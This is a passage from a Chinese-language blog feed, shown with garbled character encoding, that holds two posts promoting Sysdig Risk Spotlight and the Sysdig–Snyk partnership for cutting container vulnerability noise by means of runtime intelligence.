    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä½ çš„å›¢é˜Ÿæ˜¯å¦è¢«å®¹å™¨é•œåƒçš„æ¼æ´ä¿¡æ¯æ·¹æ²¡ï¼Ÿä½ æ˜¯å¦èŠ±è´¹äº†å¤§é‡æ—¶é—´ç¡®å®šåœ¨å“ªé‡Œé›†ä¸­èµ„æºå»ä¿®å¤æ¼æ´ï¼Œä½†ä»ç„¶é”™è¿‡äº†å±é™©çš„æ¼æ´ï¼Ÿè¯·çŸ¥é“ï¼Œä½ å¹¶ä¸å­¤å•ã€‚</p><p>å®¹å™¨ç¯å¢ƒé€šè¿‡å‰æ‰€æœªæœ‰çš„é€Ÿåº¦æ”¹å˜äº†åº”ç”¨ç¨‹åºå¼€å‘ï¼Œä½†è¿™å¹¶éæ²¡æœ‰ä»£ä»·ã€‚ä½¿ç”¨ç°æˆçš„ç¬¬ä¸‰æ–¹å®¹å™¨é•œåƒå’Œå¼€æºä»£ç å¯ä»¥å¤§å¤§åŠ å¿«å¼€å‘å‘¨æœŸï¼Œä½†ä¹Ÿä¿ƒæˆäº†åº”ç”¨ç¨‹åºä¸­æ¼æ´çš„å¼•å…¥ã€‚ä¸€ä¸ªå®¹å™¨å¯èƒ½æœ‰æ•°ç™¾ä¸ªæ¼æ´ï¼›æ›´å¤æ‚çš„åº”ç”¨ç¨‹åºç¯å¢ƒå¯èƒ½è¾¾åˆ°æ•°ä¸‡ä¸ªæ¼æ´ã€‚</p><h2 id="0x01-èƒŒæ™¯ï¼šå®¹å™¨æ¼æ´è¿‡è½½æ—¥ç›Šæˆä¸ºä¸€ä¸ªæŒ‘æˆ˜"><a href="#0x01-èƒŒæ™¯ï¼šå®¹å™¨æ¼æ´è¿‡è½½æ—¥ç›Šæˆä¸ºä¸€ä¸ªæŒ‘æˆ˜" class="headerlink" title="0x01 èƒŒæ™¯ï¼šå®¹å™¨æ¼æ´è¿‡è½½æ—¥ç›Šæˆä¸ºä¸€ä¸ªæŒ‘æˆ˜"></a>0x01 èƒŒæ™¯ï¼šå®¹å™¨æ¼æ´è¿‡è½½æ—¥ç›Šæˆä¸ºä¸€ä¸ªæŒ‘æˆ˜</h2><p>æƒ…å†µå¹¶æœªå¥½è½¬ï¼Œç‰¹åˆ«æ˜¯<a href="https://www.cvedetails.com/browse-by-date.php">2016 å¹´è‡³ 2017 å¹´ï¼Œæ–°çš„æ¼æ´æ•°é‡å¢åŠ äº†å°†è¿‘ä¸¤å€</a>ã€‚</p><p><img src="/image/image_l8jh8jhaa9.png" alt="å›¾ 1ï¼šæ¯å¹´çš„ CVE æ¼æ´æ•°é‡" title="å›¾ 1ï¼š æ¯å¹´çš„CVEæ¼æ´æ•°é‡"></p><p>æ®ç¾å›½ç½‘ç»œå®‰å…¨ä¸åŸºç¡€è®¾æ–½å®‰å…¨å±€ï¼ˆCISAï¼‰æŠ¥å‘Šï¼š<a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-040a">è½¯ä»¶æ¼æ´åœ¨ 2021 å¹´å‹’ç´¢è½¯ä»¶äº‹ä»¶çš„åˆå§‹æ„ŸæŸ“é€”å¾„ä¸­ä»ç„¶ä½åˆ—å‰ä¸‰</a>ã€‚å› æ­¤ï¼ŒåŠæ—¶å‘ç°å’Œä¿®å¤æ¼æ´å¯¹äºé˜²æ­¢å®‰å…¨æ¼æ´è‡³å…³é‡è¦ã€‚</p><p><img src="/image/image_swqcLqVpfO.png" alt="å›¾ 2:2021 Trends Show Increased Globalized Threat of Ransomware" title="å›¾2ï¼š2021 Trends Show Increased Globalized Threat of Ransomware"></p><p>åœ¨å®¹å™¨çš„ä¸–ç•Œä¸­ï¼Œç®¡ç†æ¼æ´å·²ç»å˜æˆäº†ä¸€ä¸ªå¤æ‚çš„å¹³è¡¡é£é™©ã€æœ‰é™èµ„æºå’Œå¯¹å¼€å‘çš„å½±å“çš„æ–¹ç¨‹å¼ã€‚ä¿®å¤æ‰€æœ‰é—®é¢˜æ—¢ä¸ç°å®ä¹Ÿæ²¡å¿…è¦ã€‚å¹¶éæ‰€æœ‰æ¼æ´éƒ½ä¼šå¸¦æ¥é£é™©ï¼Œä½†æ‰¾å‡ºé‚£äº›ä¸èƒ½ç­‰å¾…ï¼Œéœ€è¦ç«‹å³ä¿®å¤çš„æ¼æ´å´åƒæ˜¯å¤§æµ·æé’ˆä¸€æ ·å›°éš¾ã€‚</p><p>DevOps å’Œå®‰å…¨å›¢é˜Ÿéƒ½çŸ¥é“ï¼Œå‘å¼€å‘äººå‘˜æä¾›ä¸€é•¿ä¸²æ¼æ´æ˜¯è¡Œä¸é€šçš„ï¼Œä½†å°†åº”ç”¨ç¨‹åºæš´éœ²ç»™æ”»å‡»è€…ä¹Ÿä¸æ˜¯ä¸€ä¸ªå¥½çš„é€‰é¡¹ã€‚å¼€å‘äººå‘˜æƒ³çŸ¥é“çš„æ˜¯ï¼Œå“ªäº›æ¼æ´éœ€è¦ä¼˜å…ˆå¤„ç†ï¼Œç«‹å³é‡‡å–è¡ŒåŠ¨ã€‚</p><h2 id="0x02-é—®é¢˜ï¼šç°æœ‰çš„ä¼˜å…ˆçº§åˆ’åˆ†æ–¹æ³•å¹¶ä¸æœ‰æ•ˆ"><a href="#0x02-é—®é¢˜ï¼šç°æœ‰çš„ä¼˜å…ˆçº§åˆ’åˆ†æ–¹æ³•å¹¶ä¸æœ‰æ•ˆ" class="headerlink" title="0x02 é—®é¢˜ï¼šç°æœ‰çš„ä¼˜å…ˆçº§åˆ’åˆ†æ–¹æ³•å¹¶ä¸æœ‰æ•ˆ"></a>0x02 é—®é¢˜ï¼šç°æœ‰çš„ä¼˜å…ˆçº§åˆ’åˆ†æ–¹æ³•å¹¶ä¸æœ‰æ•ˆ</h2><p>äººä»¬é€šå¸¸é€šè¿‡ CVSS åˆ†æ•°å®šä¹‰çš„å¨èƒç­‰çº§æ¥å‡å°‘æ¼æ´è´Ÿè½½ï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•å­˜åœ¨éå¸¸ä¸¥é‡çš„ç¼ºé™·ã€‚å³ä½¿ä¿®å¤äº†é«˜å±å’Œä¸¥é‡çº§åˆ«çš„æ¼æ´ï¼Œæ¼æ´çš„è´Ÿè½½ä¹Ÿä¸ä¼šå‡å°‘åˆ°å¯ç®¡ç†çš„èŒƒå›´ä¹‹å†…ï¼Œå› ä¸ºæ¼æ´çš„æ•°é‡è¿œè¿œè¶…è¿‡äº†å›¢é˜Ÿçš„å¤„ç†èƒ½åŠ›ï¼Œå›¢é˜Ÿéœ€è¦è¿›ä¸€æ­¥ç¡®å®šæ¼æ´çš„å¤„ç†ä¼˜å…ˆçº§ã€‚ä½†è®¤è¯†åˆ° CVSS åˆ†æ•°å¯èƒ½ä¼šäº§ç”Ÿè¯¯å¯¼ä¹Ÿå¾ˆé‡è¦ã€‚</p><p>å®‰å…¨ç ”ç©¶å‘˜ Miguel HernÃ¡ndez åœ¨ä»–çš„åšå®¢ã€Š<a href="https://sysdig.com/blog/vulnerability-score-cvss-meaning/">Are vulnerability scores misleading you? Understanding CVSS score</a>ã€‹ä¸­è¯´åˆ°ï¼šé«˜å±æ¼æ´å¯èƒ½åªæ˜¯å™ªéŸ³ï¼Œå®ƒä¸ä¼šå¯¹æ‚¨çš„åº”ç”¨ç¨‹åºé€ æˆä»»ä½•å®é™…çš„é£é™©ã€‚è€Œä¸­å±æ¼æ´å¯èƒ½ä¼šç»™æ”»å‡»è€…æä¾›åˆ‡å…¥ç‚¹ï¼Œä»è€Œæ¼”å˜æˆå¹¿æ³›ä¸”æœ‰å±å®³çš„å½±å“ã€‚å› æ­¤ï¼Œä»…æ ¹æ® CVSS åˆ†æ•°ç¡®å®šä¼˜å…ˆçº§æ˜¯ä½æ•ˆçš„ï¼Œç”šè‡³æ˜¯æ— æ•ˆçš„ã€‚</p><p>å…¶ä»–çš„æ¼æ´ä¼˜å…ˆçº§æ–¹æ³•ä¼šå°è¯•é‡‡ç”¨ä¸€äº›é¢å¤–çš„é£é™©å› ç´ ï¼Œä½†è¿™åŒæ ·æ— æ³•è§£å†³æ¼æ´è¿‡è½½çš„é—®é¢˜ï¼Œå› ä¸ºå®ƒä»¬æ— æ³•åˆ¤æ–­ä¸€äº›æ¼æ´ä¼šä¸ä¼šå¯¹å…·ä½“çš„ç¯å¢ƒé€ æˆä¸€äº›å®é™…çš„é£é™©ï¼Œæ— æ³•æ¶ˆé™¤æ¼æ´ä¸­çš„å™ªéŸ³ã€‚</p><h2 id="0x03-åŸç†ï¼šRisk-Spotlight-æ¶ˆé™¤å™ªéŸ³å¹¶è‡ªåŠ¨å‘ç°çœŸæ­£é‡è¦çš„æ¼æ´"><a href="#0x03-åŸç†ï¼šRisk-Spotlight-æ¶ˆé™¤å™ªéŸ³å¹¶è‡ªåŠ¨å‘ç°çœŸæ­£é‡è¦çš„æ¼æ´" class="headerlink" title="0x03 åŸç†ï¼šRisk Spotlight æ¶ˆé™¤å™ªéŸ³å¹¶è‡ªåŠ¨å‘ç°çœŸæ­£é‡è¦çš„æ¼æ´"></a>0x03 åŸç†ï¼šRisk Spotlight æ¶ˆé™¤å™ªéŸ³å¹¶è‡ªåŠ¨å‘ç°çœŸæ­£é‡è¦çš„æ¼æ´</h2><p><strong>å®¹å™¨é•œåƒæ¼æ´æŠ¥å‘Šä¸­çš„å¤§å¤šæ•°æ¼æ´å®é™…ä¸Šéƒ½æ˜¯å™ªéŸ³ã€‚</strong> å› ä¸ºå®¹å™¨ä¸­åŒ…å«ç€è®¸å¤šä»æœªè¢«ä½¿ç”¨è¿‡çš„è½¯ä»¶åŒ…ã€‚å³ä½¿è¿™äº›è½¯ä»¶åŒ…ä»æœªè¢«ä½¿ç”¨è¿‡ï¼Œä½†æ˜¯ä»ç„¶ä¼šåœ¨æ¼æ´æ‰«ææŠ¥å‘Šä¸­ã€‚</p><p><strong>æ¼æ´çš„å¯åˆ©ç”¨æ€§æ˜¯æ˜¯å¦é€ æˆå®é™…çš„é£é™©çš„å…³é”®å†³å®šå› ç´ ã€‚</strong> å¦‚æœæ¼æ´ä»æœªè¢«æš´éœ²å‡ºæ¥ï¼Œé‚£ä¹ˆè¯¥æ¼æ´å°±ä¸ä¼šæä¾›è¢«åˆ©ç”¨çš„æœºä¼šï¼Œä¹Ÿä¸ä¼šå¸¦æ¥å®é™…çš„é£é™©ï¼Œå®¹å™¨è¿è¡Œçš„è¿‡ç¨‹ä¸­ä¸æ´»è·ƒçš„è½¯ä»¶åŒ…ä¸­çš„æ¼æ´ä¹Ÿåªæ˜¯å™ªéŸ³ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•åˆ¤æ–­å“ªäº›å®¹å™¨å·²ç»è¢«æš´éœ²å‡ºæ¥å¹¶ä¼šæ„æˆçœŸæ­£çš„é£é™©å‘¢ï¼ŸSysdig æå‡ºï¼Œå¯ä»¥ä½¿ç”¨<strong>è¿è¡Œæ—¶æ™ºèƒ½</strong>æ¥è§£å†³è¯¥é—®é¢˜ã€‚</p><p><img src="/image/image_n19hGiyhg1.png" alt="å›¾ 3ï¼šä½¿ç”¨è¿è¡Œæ—¶æ™ºèƒ½æ¥æ¶ˆé™¤å®¹å™¨é•œåƒä¸­çš„æ¼æ´å™ªéŸ³" title="å›¾3ï¼šä½¿ç”¨è¿è¡Œæ—¶æ™ºèƒ½æ¥æ¶ˆé™¤å®¹å™¨é•œåƒä¸­çš„æ¼æ´å™ªéŸ³"></p><p>Sysdig å¯ä»¥é€šè¿‡è§‚æµ‹å®¹å™¨ä¸­çš„ç³»ç»Ÿè°ƒç”¨æ¥å‡†ç¡®è¯†åˆ«è¿è¡Œæ—¶åŠ è½½çš„è½¯ä»¶åŒ…ï¼Œæ¶ˆé™¤å®¹å™¨æ¼æ´ä¼˜å…ˆçº§ä¸­å¯¹æ¼æ´å¯åˆ©ç”¨æ€§çš„çŒœæµ‹ã€‚é€šè¿‡äº†è§£æš´éœ²çš„å†…å®¹å’Œæœªæš´éœ²çš„å†…å®¹ï¼ŒRisk Spotlight æ¶ˆé™¤äº†å™ªéŸ³å’Œä¼˜å…ˆçº§çŒœæµ‹ï¼Œä»¥ä¾¿å›¢é˜Ÿå¯ä»¥ä¸“æ³¨äºè¿«ä¸åŠå¾…çš„çœŸæ­£é‡è¦é—®é¢˜ã€‚</p><h2 id="0x04-è§£å†³æ–¹æ¡ˆï¼šäº†è§£ä½¿ç”¨-Sysdig-å¦‚ä½•å¿«é€Ÿã€è½»æ¾åœ°è¯†åˆ«å“ªäº›æ¼æ´æ„æˆçœŸæ­£çš„é£é™©"><a href="#0x04-è§£å†³æ–¹æ¡ˆï¼šäº†è§£ä½¿ç”¨-Sysdig-å¦‚ä½•å¿«é€Ÿã€è½»æ¾åœ°è¯†åˆ«å“ªäº›æ¼æ´æ„æˆçœŸæ­£çš„é£é™©" class="headerlink" title="0x04 è§£å†³æ–¹æ¡ˆï¼šäº†è§£ä½¿ç”¨ Sysdig å¦‚ä½•å¿«é€Ÿã€è½»æ¾åœ°è¯†åˆ«å“ªäº›æ¼æ´æ„æˆçœŸæ­£çš„é£é™©"></a>0x04 è§£å†³æ–¹æ¡ˆï¼šäº†è§£ä½¿ç”¨ Sysdig å¦‚ä½•å¿«é€Ÿã€è½»æ¾åœ°è¯†åˆ«å“ªäº›æ¼æ´æ„æˆçœŸæ­£çš„é£é™©</h2><p>å¦‚æœå‘ DevOps å’Œå®‰å…¨å›¢é˜Ÿå‘é€ä¸€ä»½åŒ…å«æ•°ç™¾ä¸ªæ¼æ´çš„æŠ¥å‘Šï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå› ä¸ºåœ¨ä¸æ¶ˆé™¤å™ªéŸ³çš„æƒ…å†µä¸‹ï¼Œå¯¹æ¼æ´è¿›è¡Œä¼˜å…ˆçº§æ’åºæ˜¯æ— æ•ˆçš„ã€‚å¦‚æœåªæœ‰å°‘æ•°çš„å‡ ä¸ªæ¼æ´ä¼šç»™æ”»å‡»è€…æä¾›çœŸæ­£çš„åˆ©ç”¨çš„æœºä¼šï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¦è®©æ‚¨çš„å›¢é˜Ÿæ‰¿æ‹…ä¸æ„æˆé£é™©çš„æ¼æ´å‘¢ï¼Ÿ</p><p><img src="/image/image_935aozXuii.png" alt="å›¾ 4ï¼šäº‘åŸç”Ÿçš„å·¥ä½œè´Ÿè½½ä¸­åŒ…å«å¤§é‡çš„æ¼æ´" title="å›¾4ï¼šäº‘åŸç”Ÿçš„å·¥ä½œè´Ÿè½½ä¸­åŒ…å«å¤§é‡çš„æ¼æ´"></p><p>å€ŸåŠ© Risk Spotlightï¼Œæ‚¨å¯ä»¥å–æ¶ˆä¸€äº›æ¼æ´çš„ä¿®å¤ä¼˜å…ˆçº§ï¼Œå¹¶å°†ä¿®å¤å·¥ä½œçš„é‡å¿ƒæ”¾åœ¨ä¼šç›´æ¥æ„æˆé£é™©çš„æ¼æ´ä¸Šï¼Œä»è€Œå¯ä»¥ä½¿ç”¨æœ€å°‘çš„èµ„æºæ›´å¿«çš„ä¿®å¤æ›´é‡è¦çš„æ¼æ´ã€‚</p><p><img src="/image/image_nbY_MArxvx.png" alt="å›¾ 5ï¼šå€ŸåŠ© Risk Spotlight ç­›é€‰å‡ºéœ€è¦ä¼˜å…ˆä¿®å¤çš„æ¼æ´" title="å›¾5ï¼šå€ŸåŠ©Risk Spotlight ç­›é€‰å‡ºéœ€è¦ä¼˜å…ˆä¿®å¤çš„æ¼æ´"></p><h2 id="0x05-æ€»ç»“ï¼šé£é™©èšç„¦çš„ä¸»è¦å¥½å¤„"><a href="#0x05-æ€»ç»“ï¼šé£é™©èšç„¦çš„ä¸»è¦å¥½å¤„" class="headerlink" title="0x05 æ€»ç»“ï¼šé£é™©èšç„¦çš„ä¸»è¦å¥½å¤„"></a>0x05 æ€»ç»“ï¼šé£é™©èšç„¦çš„ä¸»è¦å¥½å¤„</h2><p>æ›´å¤šä¿¡æ¯è¯·è§‚çœ‹ Youtobe è§†é¢‘ï¼š<a href="https://www.youtube.com/watch?v=9HIhQcrBRKM">Reducing vulnerability noise with Sysdig</a>ï¼Œæ€»çš„æ¥è¯´ï¼Œé£é™©èšç„¦çš„å¥½å¤„æœ‰ï¼š</p><ul><li><strong>å°†æ¼æ´å™ªéŸ³å‡å°‘é«˜è¾¾ 95%</strong>ã€‚Risk Spotlight é€šè¿‡è¯†åˆ«è¿è¡Œæ—¶æœªä½¿ç”¨çš„åŒ…æ¥æ¶ˆé™¤ä¸ä¼šç«‹å³é€ æˆé£é™©çš„æ¼æ´å¸¦æ¥çš„å¹²æ‰°ã€‚</li><li><strong>é€šè¿‡å¯è¡Œçš„è§è§£æ¥ç®¡ç†é£é™©</strong>ã€‚Risk Spotlight æä¾›ä¸°å¯Œçš„æ¼æ´è¯¦ç»†ä¿¡æ¯ï¼Œä¾‹å¦‚æ¥è‡ªå¤šä¸ªæ¥æºçš„ CVSS å‘é‡ã€æ¼æ´ä¿®å¤ç‰ˆæœ¬å’Œå…¬å¼€å¯ç”¨æ¼æ´çš„é“¾æ¥ï¼ŒRisk Spotlight è¿˜æä¾›äº†ä»¥è½¯ä»¶åŒ…ä¸ºä¸­å¿ƒçš„è§†å›¾ï¼Œæœ‰åŠ©äºå¤§è§„æ¨¡ä¿®å¤å’Œç®¡ç†æ¼æ´é£é™©ã€‚</li><li><strong>å¯¹å®¹å™¨ä»æºåˆ°è¿è¡Œçš„å…¨é¢æ¼æ´ç®¡ç†</strong>ã€‚Risk Spotlight æä¾›äº†æ•´ä¸ªå®¹å™¨ç”Ÿå‘½å‘¨æœŸï¼ˆä»æ„å»ºåˆ°è¿è¡Œæ—¶ï¼‰çš„æ¼æ´é£é™©çš„å•ä¸€è§†å›¾ã€‚å¼€å‘äººå‘˜å¯ä»¥ç«‹å³é‡‡å–è¡ŒåŠ¨ï¼Œä»¥ç¼“è§£æ„æˆçœŸæ­£é£é™©çš„å°‘æ•°æ¼æ´ï¼Œå¹¶é€šè¿‡åœ¨æ„å»ºè¿‡ç¨‹ä¸­åˆ é™¤æœªä½¿ç”¨çš„åŒ…æ¥å°½æ—©åº”ç”¨å®‰å…¨æœ€ä½³å®è·µã€‚</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sysdig å’Œ Snyk ä½¿ç”¨è¿è¡Œæ—¶æ™ºèƒ½æ¥æ¶ˆé™¤æ¼æ´å™ªéŸ³</title>
    <link href="/2024/05/12/Sysdig-%E5%92%8C-Snyk-%E4%BD%BF%E7%94%A8%E8%BF%90%E8%A1%8C%E6%97%B6%E6%99%BA%E8%83%BD%E6%9D%A5%E6%B6%88%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%99%AA%E9%9F%B3/"/>
    <url>/2024/05/12/Sysdig-%E5%92%8C-Snyk-%E4%BD%BF%E7%94%A8%E8%BF%90%E8%A1%8C%E6%97%B6%E6%99%BA%E8%83%BD%E6%9D%A5%E6%B6%88%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%99%AA%E9%9F%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åœ¨å½“ä»Šçš„äº‘ç¯å¢ƒä¸­æœ€å¤§çš„æŒ‘æˆ˜ä¹‹ä¸€æ˜¯ï¼šåœ¨ç¡®ä¿å¿«é€Ÿçš„å¼€å‘å‘¨æœŸçš„åŒæ—¶ï¼Œè¿˜éœ€è¦è·Ÿä¸Šå®‰å…¨æ¼æ´çš„æ­¥ä¼ã€‚2022 å¹´ 2 æœˆ 16 æ—¥ï¼Œ<a href="https://sysdig.com/press-releases/sysdig-and-snyk-announce-container-security-partnership">Sysdig å’Œ Snyk å®£å¸ƒå»ºç«‹åˆä½œä¼™ä¼´å…³ç³»</a>ï¼Œä¸ºå®¹å™¨è¿è¡Œæ—¶å®‰å…¨æä¾›é›†æˆä»£ç ï¼Œæ¶ˆé™¤é«˜è¾¾ 95% çš„æ¼æ´è­¦æŠ¥å™ªå£°ã€ä¼˜åŒ–ä¿®å¤æµç¨‹å¹¶ä¿æŠ¤è¿è¡Œæ—¶å®‰å…¨ã€‚è®©å¼€å‘äººå‘˜å¯ä»¥å¿«é€Ÿæ¶ˆé™¤å®‰å…¨éšœç¢ï¼ŒåŒæ—¶åˆä¸ç‰ºç‰²å®‰å…¨ã€‚</p><h2 id="0x01-èƒŒæ™¯ï¼šæ¼æ´è¿‡è½½ä¼šæŸå®³å®‰å…¨æ€§å’Œç”Ÿäº§åŠ›"><a href="#0x01-èƒŒæ™¯ï¼šæ¼æ´è¿‡è½½ä¼šæŸå®³å®‰å…¨æ€§å’Œç”Ÿäº§åŠ›" class="headerlink" title="0x01 èƒŒæ™¯ï¼šæ¼æ´è¿‡è½½ä¼šæŸå®³å®‰å…¨æ€§å’Œç”Ÿäº§åŠ›"></a>0x01 èƒŒæ™¯ï¼šæ¼æ´è¿‡è½½ä¼šæŸå®³å®‰å…¨æ€§å’Œç”Ÿäº§åŠ›</h2><p>äº‘åŸç”ŸåŠ å¿«çš„å¼€å‘æ­¥ä¼ä¿ƒè¿›äº†æ›´å¿«çš„åˆ›æ–°ï¼Œä½†ä¹Ÿç§¯å‹ä¸‹è¶Šæ¥è¶Šå¤šçš„æ¼æ´ã€‚å¼€å‘äººå‘˜ä¸ä»…å¯¹æ¼æ´ä¸çŸ¥æ‰€æªï¼Œè¿˜ä¸çŸ¥é“æ¼æ´æ‰€å¸¦æ¥çš„å®é™…çš„é£é™©å’Œä¿®å¤å·¥ä½œçš„é‡ç‚¹ã€‚å› ä¸ºä»…è¯•å›¾ç†è§£è¿™äº›å™ªéŸ³å°±å·²ç»å ç”¨äº†å®è´µçš„æ•²ä»£ç çš„æ—¶é—´äº†ï¼Œæ›´åˆ«è¯´è¦å°†æ—¶é—´èŠ±è´¹åœ¨ä¸€äº›ä¸ä¼šå¸¦æ¥çœŸæ­£çš„é£é™©çš„æ— å…³ç´§è¦çš„æ¼æ´ä¸Šæ‰€å¸¦æ¥çš„æŒ«è´¥æ„Ÿã€‚</p><p>åœ¨ç›‘æ§è¿è¡Œæ—¶ç¯å¢ƒçš„å®‰å…¨è¿è¥å›¢é˜Ÿä¸­ï¼Œä¹Ÿå……æ–¥äº†æ¼æ´è­¦æŠ¥çš„å™ªéŸ³ï¼Œè¿™äº›å™ªéŸ³åˆ†æ•£äº†äººä»¬å¯¹çœŸæ­£çš„å¨èƒçš„æ³¨æ„åŠ›ï¼Œè€Œåœ¨å¯¹æ¼æ´è¿›è¡Œåˆ†ç±»ä¸Šæµªè´¹èµ„æºçš„ä»£ä»·å¾ˆé«˜ã€‚æ® <a href="https://sysdig.com/blog/2022-cloud-native-security-usage-report/#.YfOJ6L1MmK4.linkedin" title="ã€ŠSysdig 2022å¹´äº‘åŸç”Ÿå®‰å…¨å’Œä½¿ç”¨ã€‹">ã€ŠSysdig 2022 å¹´äº‘åŸç”Ÿå®‰å…¨å’Œä½¿ç”¨ã€‹</a>çš„æŠ¥å‘Šæ˜¾ç¤ºï¼šå¤šè¾¾ 75% çš„å¯ä¿®å¤çš„é«˜å±å’Œä¸¥é‡æ¼æ´åœ¨ç”Ÿäº§ç¯å¢ƒä¸­çš„å®¹å™¨ä¸­è¿è¡Œã€‚è¿‡è½½çš„æ¼æ´ä¸ä»…ä¼šè®©æ¼æ´ä¿®å¤çš„è¿‡ç¨‹å˜å¾—éš¾ä»¥ç®¡ç†ï¼Œè¿˜ç»™æ”»å‡»è€…åˆ©ç”¨ç•™ä¸‹å¾ˆå¤§çš„æ¼æ´æš´éœ²çš„çª—å£ï¼Œæ®ç»Ÿè®¡ï¼Œç»„ç»‡ä¸å¾—ä¸å¹³å‡èŠ±è´¹å¤§çº¦ 6 ä¸ªæœˆæ¥å¯¹æ¼æ´è¿›è¡Œä¿®å¤ã€‚</p><p><img src="/image/image_izQBggE6QQ.png" alt="å›¾ 1:75% çš„å®¹å™¨å­˜åœ¨é«˜å±æˆ–ä¸¥é‡çº§åˆ«çš„æ¼æ´" title="å›¾1ï¼š75%çš„å®¹å™¨å­˜åœ¨é«˜å±æˆ–ä¸¥é‡çº§åˆ«çš„æ¼æ´"></p><p>ä¿®å¤æ‰€æœ‰çš„æ¼æ´æ˜¾ç„¶æ˜¯ä¸€ä¸ªä¸åˆ‡å®é™…çš„ç›®æ ‡ï¼Œä½†æ˜¯ä¸åŠæ—¶ä¿®å¤åˆæ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„èµŒæ³¨ã€‚<strong>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®šæ¼æ´ä¿®å¤çš„ä¼˜å…ˆçº§ã€‚</strong></p><h2 id="0x02-è§£å†³æ–¹æ¡ˆï¼šé€šè¿‡è¿è¡Œæ—¶æ™ºèƒ½è¿‡æ»¤å™ªéŸ³"><a href="#0x02-è§£å†³æ–¹æ¡ˆï¼šé€šè¿‡è¿è¡Œæ—¶æ™ºèƒ½è¿‡æ»¤å™ªéŸ³" class="headerlink" title="0x02 è§£å†³æ–¹æ¡ˆï¼šé€šè¿‡è¿è¡Œæ—¶æ™ºèƒ½è¿‡æ»¤å™ªéŸ³"></a>0x02 è§£å†³æ–¹æ¡ˆï¼šé€šè¿‡è¿è¡Œæ—¶æ™ºèƒ½è¿‡æ»¤å™ªéŸ³</h2><p>ç°å¦‚ä»Šï¼Œåº”ç”¨ç¨‹åºéƒ½æ˜¯ç”±å¤§é‡çš„å¼€æºçš„ç¬¬ä¸‰æ–¹è½¯ä»¶åŒ…ç»„è£…è€Œæ¥ï¼Œè¿™ä½¿å¾—åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´æ˜¯æ™®éå­˜åœ¨çš„ï¼Œä»¥è‡³äºå®¹å™¨ä¸­çš„è½¯ä»¶åŒ…å­˜åœ¨æ•°ä»¥ä¸‡äº¿è®¡çš„æ¼æ´ã€‚å€ŸåŠ©<a href="https://snyk.co/ueizO" title="Snyk Container">Snyk Container</a>ï¼Œå¼€å‘äººå‘˜å¯ä»¥åœ¨æ•´ä¸ªè½¯ä»¶å¼€å‘çš„è¿‡ç¨‹ä¸­è·å¾—å®‰å…¨åé¦ˆï¼ŒçŸ¥é“å¦‚ä½•åœ¨æ›´å®‰å…¨çš„åŸºç¡€é•œåƒä¸Šæ„å»ºå®¹å™¨ã€‚</p><p>ç„¶è€Œï¼Œå®¹å™¨é€šå¸¸ä¼šå› åº”ç”¨ç¨‹åºè¿è¡Œæ—¶æœªä½¿ç”¨çš„å†…å®¹å’ŒåŒ…è€Œå˜å¾—ååˆ†è‡ƒè‚¿ã€‚å› æ­¤ï¼Œåœ¨æ²¡æœ‰é¢„å…ˆé™åˆ¶çš„æƒ…å†µä¸‹ï¼Œå¯¹æ¼æ´è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼ˆå³ï¼Œå°†é‡è¦çš„å†…å®¹ä¸æ ¹æœ¬ä¸é‡è¦çš„å†…å®¹åˆ†å¼€ï¼‰å¯ä»¥è®©æ‚¨ä»ç°æœ‰çš„ä¼˜å…ˆçº§æ’åºæ–¹æ¡ˆä¸­è·ç›Šã€‚å™ªéŸ³è¿›æ¥äº†åˆå‡ºå»ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ¼æ´è¶…è½½æ‰€å¸¦æ¥çš„ç—›è‹¦å¦‚æ­¤æ™®éï¼Œè¿™å°±æ˜¯<a href="https://sysdig.com/products/secure/" title="Sysdig Secure">Sysdig Secure</a>å®¹å™¨è¿è¡Œæ—¶å®‰å…¨æ™ºèƒ½å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚</p><p>Sysdig é€šè¿‡ Falco å¼€åˆ›äº†äº‘åŸç”Ÿè¿è¡Œæ—¶å¨èƒæ£€æµ‹å’Œå“åº”çš„å…ˆæ²³ï¼Œæ¨åŠ¨äº†äº‘å’Œå®¹å™¨å®‰å…¨çš„æ ‡å‡†ã€‚Falco æ˜¯è·¨ Kubernetesã€å®¹å™¨å’Œäº‘è¿›è¡ŒæŒç»­é£é™©å’Œå¨èƒæ£€æµ‹çš„å¼€æºæ ‡å‡†ã€‚</p><p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ Sysdig çš„å®¹å™¨è¿è¡Œæ—¶é£é™©æƒ…æŠ¥ï¼Œæ¼æ´å™ªéŸ³å¯å‡å°‘å¤šè¾¾ 95%ã€‚è¿™ç§æ€¥éœ€çš„å™ªéŸ³æ¶ˆé™¤æ˜¯é€šè¿‡å…³æ³¨å½±å“å®¹å™¨è¿è¡Œæ—¶å®é™…ä½¿ç”¨çš„åŒ…çš„æ¼æ´æ¥å®ç°çš„ã€‚è¿™äº›æ˜¯é¦–å…ˆè¦è§£å†³çš„é—®é¢˜ï¼Œå› ä¸ºå®ƒä»¬ç¡®å®é¢ä¸´ç€è¢«åˆ©ç”¨çš„é£é™©ã€‚</p><p><img src="/image/image_-MhEfQmDkN.png" alt="å›¾ 2ï¼šSysdig è¿è¡Œæ—¶æ™ºèƒ½å¯ä»¥æœ‰æ•ˆå‡å°‘æ¼æ´å™ªéŸ³" title="å›¾2ï¼šSysdig 